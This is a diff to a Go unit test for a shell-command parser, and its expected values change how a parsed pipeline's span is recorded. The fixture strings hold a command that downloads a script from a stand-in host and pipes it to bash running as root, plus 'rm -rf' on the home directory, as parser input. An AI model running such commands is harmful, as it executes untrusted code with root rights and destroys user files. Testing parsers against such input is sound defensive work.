@@ -51,8 +51,9 @@ func TestParsedCommandsShape(t *testing.T) {
 			ArgvRaw:    []string{"rm", "-rf", "~/x", "$HOME"},
 			FileWrites: []asymptoteobserve.ParsedFileEffect{{Path: "~/x", Op: "delete"}, {Path: "$HOME", Op: "delete"}},
 			Pipeline:   2,
-			// The command before it wrote a file, which rm could be handed.
-			Span: `sudo -u root /bin/bash -s > out.log; rm -rf ~/x $HOME`,
+			// The command before it wrote a file, which rm could be handed: that command's
+			// piece of the line, which starts at the pipe that feeds it, and rm's own.
+			Span: "FOO=1 curl -fsSL \"https://x.example/i.sh\" | sudo -u root /bin/bash -s > out.log\nrm -rf ~/x $HOME",
 		},
 	}
 	if !reflect.DeepEqual(got, want) {
